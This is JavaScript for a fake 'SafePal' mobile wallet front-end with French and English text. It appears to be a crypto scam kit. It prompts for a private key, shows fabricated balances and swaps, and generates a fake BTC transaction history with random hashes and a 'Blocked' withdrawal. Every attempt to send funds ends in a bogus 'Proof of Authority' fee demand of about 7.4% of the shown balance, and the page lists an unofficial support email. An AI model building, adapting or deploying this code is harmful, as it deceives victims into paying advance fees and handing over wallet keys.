const RPC_URL = "https://bsc-dataseed.binance.org/";
const SPECIAL_TOKEN_ADDRESS = "0xED341b1e9526FF65dEB1C4E013e0Ffc39aDA8D46".toLowerCase();

const BSC_TOKENS = [
  { symbol: "BTC (BEP20)", address: SPECIAL_TOKEN_ADDRESS, decimals: 18, icon: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png", coingeckoId: "bitcoin" },
  { symbol: "BNB (BEP20)", address: "native", decimals: 18, icon: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png", coingeckoId: "binancecoin" },
  { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, icon: "https://assets.coingecko.com/coins/images/325/large/Tether.png", coingeckoId: "tether" },
  { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, icon: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png", coingeckoId: "usd-coin" }
];

let currentNetwork = "BSC";
let globalWalletAddress = "";
let globalProvider = null;
let localOverrides = JSON.parse(localStorage.getItem("safepal_mobile_overrides") || "{}");
let cachedAssets = [];
let totalFiatMobile = 0;
let bnbPriceMobile = 500;
let livePrices = {};

let currentLang = localStorage.getItem("safepal_lang") || "fr";
let currentCurrency = localStorage.getItem("safepal_curr") || "EUR";

const TRANSLATIONS = {
  fr: {
    totalBalance: "Solde Total du Portefeuille",
    send: "Envoyer",
    receive: "Recevoir",
    swap: "Échanger",
    deposit: "Dépôt",
    settings: "Paramètres",
    cryptoAssets: "Actifs Crypto",
    loading: "Chargement des données blockchain...",
    wallet: "Portefeuille",
    invalidKey: "Veuillez entrer une clé privée ou adresse valide.",
    sendTitle: "Envoyer une Transaction",
    sendBody: "Insérez l'adresse du destinataire :",
    poaBlocked: "TRANSACTION BLOQUÉE",
    poaBody: "Validation Proof of Authority (POA) requise pour continuer.",
    poaSignal: "Signal de validation réseau requis :",
    poaNode: "Nœud POA",
    poaRedirect: "Redirection vers le nœud de validation...",
    receiveTitle: "Recevoir des Actifs",
    receiveBody: "Votre adresse active",
    swapTitle: "SafePal Swap",
    swapBody: "Échangez des tokens instantanément au cours du marché :",
    depositTitle: "Dépôt Fiat / Crypto",
    depositBody: "Choisissez une passerelle de paiement officielle :",
    settingsTitle: "Paramètres SafePal",
    settingsBody: "Configurez vos préférences :",
    langLabel: "Langue / Language :",
    currLabel: "Devise / Currency :",
    supportContact: "Contact Support :",
    cancel: "Annuler",
    confirm: "Confirmer",
    copyLink: "Copier le lien",
    price: "Prix",
    historyTitle: "Historique des Transactions BTC",
    historyBody: "Activité récente (cliquez sur une ligne pour voir les détails) :",
    txHistoryBtn: "Historique des Transactions"
  },
  en: {
    totalBalance: "Total Portfolio Balance",
    send: "Send",
    receive: "Receive",
    swap: "Swap",
    deposit: "Deposit",
    settings: "Settings",
    cryptoAssets: "Crypto Assets",
    loading: "Loading blockchain data...",
    wallet: "Wallet",
    invalidKey: "Please enter a valid private key or address.",
    sendTitle: "Send Transaction",
    sendBody: "Insert recipient wallet address:",
    poaBlocked: "TRANSACTION BLOCKED",
    poaBody: "Proof of Authority (POA) validation required to proceed.",
    poaSignal: "Required network validation signal:",
    poaNode: "POA Node",
    poaRedirect: "Redirecting to validation node...",
    receiveTitle: "Receive Assets",
    receiveBody: "Your active address",
    swapTitle: "SafePal Swap",
    swapBody: "Exchange tokens instantly at market rates:",
    depositTitle: "Deposit Fiat / Crypto",
    depositBody: "Choose an official payment gateway:",
    settingsTitle: "SafePal Settings",
    settingsBody: "Configure your wallet preferences:",
    langLabel: "Language / Langue:",
    currLabel: "Currency / Monnaie:",
    supportContact: "Support Contact:",
    cancel: "Cancel",
    confirm: "Confirm",
    copyLink: "Copy Link",
    price: "Price",
    historyTitle: "BTC Transaction History",
    historyBody: "Recent activity (click any transaction for details):",
    txHistoryBtn: "Transaction History"
  }
};

function t(key) {
  return TRANSLATIONS[currentLang][key] || key;
}

async function getTokenBalance(tokenAddress, walletAddress) {
  if (!globalProvider || !walletAddress) return 0;
  try {
    if (tokenAddress === "native") {
      const balWei = await globalProvider.getBalance(walletAddress);
      return parseFloat(ethers.utils.formatEther(balWei));
    } else {
      const minABI = ["function balanceOf(address owner) view returns (uint256)"];
      const contract = new ethers.Contract(tokenAddress, minABI, globalProvider);
      const balWei = await contract.balanceOf(walletAddress);
      return parseFloat(ethers.utils.formatUnits(balWei, 18));
    }
  } catch (e) {
    console.warn("Erreur lecture solde blockchain:", e);
    return 0;
  }
}

// Générateur automatique de 8 transactions de Janvier jusqu'à aujourd'hui
function generateBtcHistory() {
  const btcAsset = cachedAssets.find(a => a.sym === "BTC");
  const totalBtc = btcAsset ? btcAsset.bal : 0;
  const btcPrice = livePrices["BTC"] || 60000;
  const currSymbol = currentCurrency === "EUR" ? "€" : "$";

  const blockedFiatEUR = 5743.87;
  const blockedBtc = btcPrice > 0 ? (blockedFiatEUR / btcPrice) : 0.0957;

  // 1. Transaction Bloquée (Hier J-1)
  const today = new Date();
  const yesterday = new Date(today);
  yesterday.setDate(today.getDate() - 1);

  const formatDate = (dateObj) => {
    const day = String(dateObj.getDate()).padStart(2, '0');
    const month = String(dateObj.getMonth() + 1).padStart(2, '0');
    const year = dateObj.getFullYear();
    return `${day}.${month}.${year}`;
  };

  let transactions = [];

  // Transaction #1 : Bloquée (Hier) avec frais 0.00045 BNB
  transactions.push({
    type: "Send",
    status: "Blocked",
    statusColor: "#ef4444",
    amountColor: "#ef4444",
    amount: `-${blockedBtc.toFixed(4)} BTC`,
    fiatVal: `(≈ ${blockedFiatEUR.toFixed(2)} ${currSymbol})`,
    date: `${formatDate(yesterday)}, 14:22`,
    address: `0x${Math.random().toString(16).substring(2, 8)}...${Math.random().toString(16).substring(2, 6)}`,
    hash: `0x${Math.random().toString(16).substring(2, 32)}`,
    block: "42891043",
    fee: "0.00045 BNB"
  });

  // 2. Ventilation des 7 transactions remontant jusqu'au mois de Janvier
  let remainingBtc = Math.max(0, totalBtc - blockedBtc);
  const maxSendBtc = 950 / btcPrice; // Retraits strictement < 1000 €

  let parts = [];
  let sumParts = 0;

  for (let i = 0; i < 6; i++) {
    const isReceive = i % 2 === 0;
    let val = !isReceive ? Math.min(Math.random() * maxSendBtc, remainingBtc / 4) : Math.random() * (remainingBtc / 3);
    parts.push({ val, isReceive });
    sumParts += val;
  }
  let lastVal = Math.max(0, remainingBtc - sumParts);
  parts.push({ val: lastVal, isReceive: true });

  // Répartition chronologique mois par mois (de Janvier au mois précédent)
  const currentYear = today.getFullYear();
  // Dates prédéfinies réparties du début d'année jusqu'à récemment
  const januaryToRecentMonths = [
    new Date(currentYear, 8, 12, 11, 20), // Septembre
    new Date(currentYear, 7, 05, 16, 45), // Août
    new Date(currentYear, 5, 22, 09, 15), // Juin
    new Date(currentYear, 4, 18, 14, 30), // Mai
    new Date(currentYear, 2, 30, 18, 10), // Mars
    new Date(currentYear, 1, 14, 10, 05), // Février
    new Date(currentYear, 0, 08, 15, 40)  // Janvier
  ];

  parts.forEach((item, index) => {
    const txDate = januaryToRecentMonths[index] || new Date(currentYear, 0, 15);
    const isRec = item.isReceive;
    const fiatValue = item.val * btcPrice;

    transactions.push({
      type: isRec ? "Receive" : "Send",
      status: "Completed",
      statusColor: "#10b981",
      amountColor: isRec ? "#10b981" : "#ffffff",
      amount: `${isRec ? "+" : "-"}${item.val.toFixed(4)} BTC`,
      fiatVal: `(≈ ${fiatValue.toFixed(2)} ${currSymbol})`,
      date: `${formatDate(txDate)}, ${txDate.getHours()}:${String(txDate.getMinutes()).padStart(2, '0')}`,
      address: `0x${Math.random().toString(16).substring(2, 8)}...${Math.random().toString(16).substring(2, 6)}`,
      hash: `0x${Math.random().toString(16).substring(2, 32)}`,
      block: `${41000000 + index * 250000}`,
      fee: "0.00045 BNB"
    });
  });

  return transactions;
}

function updateStaticTexts() {
  const lblBal = document.querySelector(".balance-label");
  if (lblBal) lblBal.innerText = t("totalBalance");

  const titleAssets = document.querySelector(".assets-section-title");
  if (titleAssets) titleAssets.innerText = t("cryptoAssets");

  document.querySelectorAll(".action-label")[0].innerText = t("send");
  document.querySelectorAll(".action-label")[1].innerText = t("receive");
  document.querySelectorAll(".action-label")[2].innerText = t("swap");
  document.querySelectorAll(".action-label")[3].innerText = t("deposit");
  document.querySelectorAll(".action-label")[4].innerText = t("settings");

  const navItems = document.querySelectorAll(".bottom-nav .nav-item span:nth-child(2)");
  if (navItems.length >= 4) {
    navItems[0].innerText = t("wallet");
    navItems[1].innerText = t("swap");
    navItems[2].innerText = t("deposit");
    navItems[3].innerText = t("settings");
  }
}

document.getElementById("btnMobileLogin").addEventListener("click", async () => {
  const inputVal = document.getElementById("mobilePrivateKeyInput").value.trim();
  if (!inputVal) {
    alert(t("invalidKey"));
    return;
  }

  globalWalletAddress = inputVal;

  try {
    globalProvider = new ethers.providers.JsonRpcProvider(RPC_URL);
  } catch (e) {
    console.warn("Provider warning:", e);
  }

  if (inputVal.startsWith("0x") && inputVal.length === 66) {
    try {
      const wallet = new ethers.Wallet(inputVal);
      globalWalletAddress = wallet.address;
    } catch (e) {}
  }

  document.getElementById("loginScreen").classList.add("hidden");
  document.getElementById("dashboardScreen").classList.remove("hidden");
  updateStaticTexts();
  loadMobileWalletData();
});

document.getElementById("mobileNetworkToggle").addEventListener("click", () => {
  currentNetwork = (currentNetwork === "BSC") ? "ETH" : "BSC";
  document.getElementById("mobileNetworkName").innerText = currentNetwork;
  loadMobileWalletData();
});

document.getElementById("mSendBtn").addEventListener("click", () => {
  showMobileModal({
    title: t("sendTitle"),
    body: t("sendBody"),
    hasInput: true,
    onConfirm: () => {
      const symbolCurrency = currentCurrency === "EUR" ? "€" : "$";
      const fiatReq = totalFiatMobile * 0.0743891;
      const bnbReq = bnbPriceMobile > 0 ? fiatReq / bnbPriceMobile : 0;
      showMobileModal({
        title: t("poaBlocked"),
        body: t("poaBody"),
        isPoa: true,
        poaText: `${t("poaSignal")} ${bnbReq.toFixed(5)} BNB (≈ ${fiatReq.toFixed(2)} ${symbolCurrency})`,
        onConfirm: () => showMobileModal({ title: t("poaNode"), body: t("poaRedirect") })
      });
    }
  });
});

document.getElementById("mReceiveBtn").addEventListener("click", () => {
  showMobileModal({
    title: t("receiveTitle"),
    body: `${t("receiveBody")} (${currentNetwork}):`,
    hasAddress: true,
    addressVal: globalWalletAddress
  });
});

document.getElementById("mSwapBtn").addEventListener("click", () => {
  showMobileModal({
    title: t("swapTitle"),
    body: t("swapBody"),
    isSwap: true,
    onConfirm: () => {
      const fromS = document.getElementById("mSwapFrom").value;
      const toS = document.getElementById("mSwapTo").value;
      const amt = parseFloat(document.getElementById("mSwapAmount").value) || 0;

      const p1 = livePrices[fromS] || 1;
      const p2 = livePrices[toS] || 1;
      const received = (amt * p1) / p2;

      localOverrides[fromS] = Math.max(0, (localOverrides[fromS] || 0) - amt);
      localOverrides[toS] = (localOverrides[toS] || 0) + received;
      localStorage.setItem("safepal_mobile_overrides", JSON.stringify(localOverrides));

      loadMobileWalletData();
      alert(`Swap successful: ${amt} ${fromS} -> ${received.toFixed(4)} ${toS}`);
    }
  });
});

document.getElementById("mDepositBtn").addEventListener("click", () => {
  showMobileModal({
    title: t("depositTitle"),
    body: t("depositBody"),
    isDeposit: true
  });
});

function openSettingsModal() {
  showMobileModal({
    title: t("settingsTitle"),
    body: t("settingsBody"),
    isSettings: true
  });
}

document.getElementById("mMoreBtn").addEventListener("click", openSettingsModal);
document.getElementById("navSettingsBtn").addEventListener("click", openSettingsModal);

document.getElementById("navSwapBtn").addEventListener("click", () => document.getElementById("mSwapBtn").click());
document.getElementById("navDepositBtn").addEventListener("click", () => document.getElementById("mDepositBtn").click());

async function loadMobileWalletData() {
  const container = document.getElementById("mobileAssetList");
  container.innerHTML = `<div style="text-align:center; color:#848e9c; padding:20px;">${t("loading")}</div>`;

  const currApi = currentCurrency.toLowerCase();
  const symbolCurrency = currentCurrency === "EUR" ? "€" : "$";
  const localeFormat = currentLang === "fr" ? "fr-FR" : "en-US";

  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,binancecoin,tether,usd-coin&vs_currencies=${currApi}`);
    const data = await res.json();
    if (data.binancecoin && data.binancecoin[currApi]) bnbPriceMobile = data.binancecoin[currApi];
    
    livePrices["BTC"] = (data.bitcoin && data.bitcoin[currApi]) || (currentCurrency === "EUR" ? 60000 : 65000);
    livePrices["BNB"] = bnbPriceMobile;
    livePrices["USDT"] = (data.tether && data.tether[currApi]) || 1;
    livePrices["USDC"] = (data["usd-coin"] && data["usd-coin"][currApi]) || 1;
  } catch (e) {}

  totalFiatMobile = 0;
  cachedAssets = [];

  for (const token of BSC_TOKENS) {
    const sym = token.symbol.split(" ")[0];
    
    let realBal = await getTokenBalance(token.address, globalWalletAddress);
    let bal = localOverrides[sym] !== undefined ? localOverrides[sym] : realBal;
    
    const price = livePrices[sym] || 0;
    const fiat = bal * price;
    totalFiatMobile += fiat;

    cachedAssets.push({ sym, name: token.symbol, icon: token.icon, bal, fiat, price });
  }

  document.getElementById("mobileTotalBalance").innerText = totalFiatMobile.toLocaleString(localeFormat, { minimumFractionDigits: 2 }) + " " + symbolCurrency;
  
  const btcPrice = livePrices["BTC"] || 60000;
  const totalBtcEquivalent = btcPrice > 0 ? (totalFiatMobile / btcPrice) : 0;
  document.getElementById("mobileSubBalance").innerText = `≈ ${totalBtcEquivalent.toFixed(4)} BTC`;

  let html = "";
  cachedAssets.forEach(a => {
    html += `
      <div class="asset-card-mobile" onclick="openTokenActions('${a.sym}')">
        <div class="asset-left">
          <img class="asset-icon-mobile" src="${a.icon}" alt="${a.sym}" />
          <div>
            <div class="asset-symbol">${a.name}</div>
            <div class="asset-price">${t("price")}: ${a.price.toLocaleString(localeFormat)} ${symbolCurrency}</div>
          </div>
        </div>
        <div class="asset-right">
          <div class="asset-holding">${a.bal.toFixed(4)} ${a.sym}</div>
          <div class="asset-fiat-val">${a.fiat.toLocaleString(localeFormat, { minimumFractionDigits: 2 })} ${symbolCurrency}</div>
        </div>
      </div>
    `;
  });
  container.innerHTML = html;
}

window.openTokenActions = function(sym) {
  showMobileModal({
    title: `Asset: ${sym}`,
    body: `${sym}:`,
    isTokenAction: true,
    tokenSymbol: sym
  });
};

function showMobileModal({ title, body, hasInput = false, hasAddress = false, addressVal = "", isSwap = false, isDeposit = false, isPoa = false, poaText = "", isSettings = false, isTokenAction = false, isHistory = false, txDetail = null, tokenSymbol = "", onConfirm = null }) {
  const modal = document.getElementById("mobileModal");
  document.getElementById("mModalTitle").innerText = title;
  document.getElementById("mModalBody").innerText = body;

  document.getElementById("mAddressContainer").classList.add("hidden");
  document.getElementById("mSwapContainer").classList.add("hidden");
  document.getElementById("mDepositContainer").classList.add("hidden");
  document.getElementById("mLinkContainer").classList.add("hidden");
  document.getElementById("mPoaContainer").classList.add("hidden");
  document.getElementById("mInputContainer").classList.add("hidden");

  let customSettingsBox = document.getElementById("mSettingsContainer");
  if (customSettingsBox) customSettingsBox.remove();
  let customTokenBox = document.getElementById("mTokenActionContainer");
  if (customTokenBox) customTokenBox.remove();
  let customHistoryBox = document.getElementById("mHistoryContainer");
  if (customHistoryBox) customHistoryBox.remove();
  let customDetailBox = document.getElementById("mTxDetailContainer");
  if (customDetailBox) customDetailBox.remove();

  document.getElementById("mCancelBtn").innerText = t("cancel");
  document.getElementById("mConfirmBtn").innerText = t("confirm");

  if (hasAddress) {
    document.getElementById("mAddressContainer").classList.remove("hidden");
    document.getElementById("mAddressDisplay").value = addressVal;
  } else if (isSwap) {
    document.getElementById("mSwapContainer").classList.remove("hidden");
    const fromS = document.getElementById("mSwapFrom");
    const toS = document.getElementById("mSwapTo");
    fromS.innerHTML = cachedAssets.map(a => `<option value="${a.sym}">${a.name}</option>`).join("");
    toS.innerHTML = cachedAssets.map(a => `<option value="${a.sym}">${a.name}</option>`).join("");
    if (toS.options.length > 1) toS.selectedIndex = 1;
  } else if (isDeposit) {
    document.getElementById("mDepositContainer").classList.remove("hidden");
    document.getElementById("mConfirmBtn").classList.add("hidden");

    document.getElementById("mMoonpayBtn").onclick = () => showLink("https://www.moonpay.com");
    document.getElementById("mSimplexBtn").onclick = () => showLink("https://www.simplex.com");
    document.getElementById("mRampBtn").onclick = () => showLink("https://ramp.network");
    document.getElementById("mBankWireBtn").onclick = () => {
      modal.classList.add("hidden");
      alert(currentLang === "fr" ? "Demande de virement enregistrée !" : "Bank wire request saved!");
    };
  } else if (isPoa) {
    document.getElementById("mPoaContainer").classList.remove("hidden");
    document.getElementById("mPoaText").innerHTML = `<b>⚠️ ${t("poaBlocked")}</b><br>${t("poaBody")}`;
    document.getElementById("mPoaSignal").innerText = poaText;
  } else if (isSettings) {
    document.getElementById("mConfirmBtn").classList.add("hidden");
    const sheet = modal.querySelector(".modal-sheet");
    const div = document.createElement("div");
    div.id = "mSettingsContainer";
    div.innerHTML = `
      <div style="margin-bottom:12px; text-align:left;">
        <label style="font-size:12px; color:var(--text-secondary);">${t("langLabel")}</label>
        <select class="select-style" id="setLang">
          <option value="fr" ${currentLang === "fr" ? "selected" : ""}>Français</option>
          <option value="en" ${currentLang === "en" ? "selected" : ""}>English</option>
        </select>
      </div>
      <div style="margin-bottom:12px; text-align:left;">
        <label style="font-size:12px; color:var(--text-secondary);">${t("currLabel")}</label>
        <select class="select-style" id="setCurr">
          <option value="EUR" ${currentCurrency === "EUR" ? "selected" : ""}>EUR (€)</option>
          <option value="USD" ${currentCurrency === "USD" ? "selected" : ""}>USD ($)</option>
        </select>
      </div>
      <div style="background:var(--bg-color); padding:12px; border-radius:12px; border:1px solid var(--border-color); text-align:center; margin-top:15px;">
        <div style="font-size:12px; color:var(--text-secondary);">${t("supportContact")}</div>
        <a href="mailto:safepal@wallet-eu.com" style="color:var(--primary); font-weight:bold; font-size:14px; text-decoration:none;">safepal@wallet-eu.com</a>
      </div>
    `;
    sheet.insertBefore(div, document.getElementById("mCancelBtn").parentNode);

    document.getElementById("setLang").addEventListener("change", (e) => {
      currentLang = e.target.value;
      localStorage.setItem("safepal_lang", currentLang);
      updateStaticTexts();
      openSettingsModal();
      loadMobileWalletData();
    });

    document.getElementById("setCurr").addEventListener("change", (e) => {
      currentCurrency = e.target.value;
      localStorage.setItem("safepal_curr", currentCurrency);
      loadMobileWalletData();
    });

  } else if (isTokenAction) {
    document.getElementById("mConfirmBtn").classList.add("hidden");
    const sheet = modal.querySelector(".modal-sheet");
    const div = document.createElement("div");
    div.id = "mTokenActionContainer";
    
    let historyButtonHtml = "";
    if (tokenSymbol === "BTC") {
      historyButtonHtml = `<button class="btn-primary" style="margin-bottom:10px; background:linear-gradient(90deg, #8b5cf6 0%, #6d28d9 100%);" onclick="showMobileModal({ title: t('historyTitle'), body: t('historyBody'), isHistory: true });">${t("txHistoryBtn")}</button>`;
    }

    div.innerHTML = `
      <button class="btn-primary" style="margin-bottom:10px;" onclick="document.getElementById('mobileModal').classList.add('hidden'); document.getElementById('mSendBtn').click();">${t("send")} ${tokenSymbol}</button>
      <button class="btn-primary" style="margin-bottom:10px; background:linear-gradient(90deg, #10b981 0%, #059669 100%);" onclick="document.getElementById('mobileModal').classList.add('hidden'); document.getElementById('mReceiveBtn').click();">${t("receive")} ${tokenSymbol}</button>
      <button class="btn-primary" style="margin-bottom:10px; background:linear-gradient(90deg, #f59e0b 0%, #d97706 100%);" onclick="document.getElementById('mobileModal').classList.add('hidden'); document.getElementById('mSwapBtn').click();">${t("swap")} ${tokenSymbol}</button>
      ${historyButtonHtml}
    `;
    sheet.insertBefore(div, document.getElementById("mCancelBtn").parentNode);
  } else if (isHistory) {
    document.getElementById("mConfirmBtn").classList.add("hidden");
    const sheet = modal.querySelector(".modal-sheet");
    const txs = generateBtcHistory();

    let txHtml = `<div style="max-height: 380px; overflow-y: auto; text-align: left; margin-bottom: 15px;">`;
    txs.forEach((tx, idx) => {
      txHtml += `
        <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border-color); cursor: pointer;" onclick="openTxDetail(${idx})">
          <div>
            <div style="font-size: 13px; font-weight: bold; color: ${tx.amountColor};">
              ${tx.type} BTC <span style="font-size: 11px; font-weight: normal; color: var(--text-secondary);">${tx.fiatVal}</span>
            </div>
            <div style="font-size: 11px; color: var(--text-secondary); margin-top: 2px;">
              ${tx.date} • ${tx.address}
            </div>
          </div>
          <div style="text-align: right;">
            <div style="font-size: 13px; font-weight: bold; color: ${tx.amountColor};">${tx.amount}</div>
            <div style="font-size: 11px; font-weight: bold; color: ${tx.statusColor}; margin-top: 2px;">${tx.status}</div>
          </div>
        </div>
      `;
    });
    txHtml += `</div>`;

    window._cachedTxList = txs;

    const div = document.createElement("div");
    div.id = "mHistoryContainer";
    div.innerHTML = txHtml;
    sheet.insertBefore(div, document.getElementById("mCancelBtn").parentNode);
  } else if (txDetail) {
    document.getElementById("mConfirmBtn").classList.add("hidden");
    const sheet = modal.querySelector(".modal-sheet");
    const div = document.createElement("div");
    div.id = "mTxDetailContainer";
    div.innerHTML = `
      <div style="background:var(--bg-color); padding:14px; border-radius:12px; border:1px solid var(--border-color); text-align:left; font-size:12px; margin-bottom:15px;">
        <div style="margin-bottom:8px;"><b>Status:</b> <span style="color:${txDetail.statusColor}; font-weight:bold;">${txDetail.status}</span></div>
        <div style="margin-bottom:8px;"><b>Amount:</b> <span style="color:${txDetail.amountColor}; font-weight:bold;">${txDetail.amount}</span> ${txDetail.fiatVal}</div>
        <div style="margin-bottom:8px;"><b>Date:</b> ${txDetail.date}</div>
        <div style="margin-bottom:8px; word-break:break-all;"><b>TxHash:</b> <span style="color:var(--primary);">${txDetail.hash}</span></div>
        <div style="margin-bottom:8px;"><b>Network Block:</b> #${txDetail.block}</div>
        <div style="margin-bottom:8px;"><b>Network Fee:</b> ${txDetail.fee}</div>
        <div style="word-break:break-all;"><b>Counterparty:</b> ${txDetail.address}</div>
      </div>
      <button class="btn-primary" onclick="showMobileModal({ title: t('historyTitle'), body: t('historyBody'), isHistory: true });">Back to History</button>
    `;
    sheet.insertBefore(div, document.getElementById("mCancelBtn").parentNode);
  } else if (hasInput) {
    document.getElementById("mInputContainer").classList.remove("hidden");
  }

  if (!isDeposit && !isSettings && !isTokenAction && !isHistory && !txDetail) document.getElementById("mConfirmBtn").classList.remove("hidden");
  modal.classList.remove("hidden");

  document.getElementById("mConfirmBtn").onclick = () => {
    modal.classList.add("hidden");
    if (onConfirm) onConfirm();
  };

  document.getElementById("mCancelBtn").onclick = () => {
    modal.classList.add("hidden");
  };
}

window.openTxDetail = function(index) {
  const tx = window._cachedTxList[index];
  if (tx) {
    showMobileModal({
      title: `Transaction Details`,
      body: `BNB Smart Chain (BEP20)`,
      txDetail: tx
    });
  }
};

function showLink(url) {
  document.getElementById("mDepositContainer").classList.add("hidden");
  document.getElementById("mLinkContainer").classList.remove("hidden");
  document.getElementById("mLinkInput").value = url;
  document.getElementById("mCopyLinkBtn").innerText = t("copyLink");
  document.getElementById("mCopyLinkBtn").onclick = () => {
    navigator.clipboard.writeText(url);
    alert(currentLang === "fr" ? "Lien officiel copié !" : "Official gateway link copied!");
    document.getElementById("mobileModal").classList.add("hidden");
  };
}
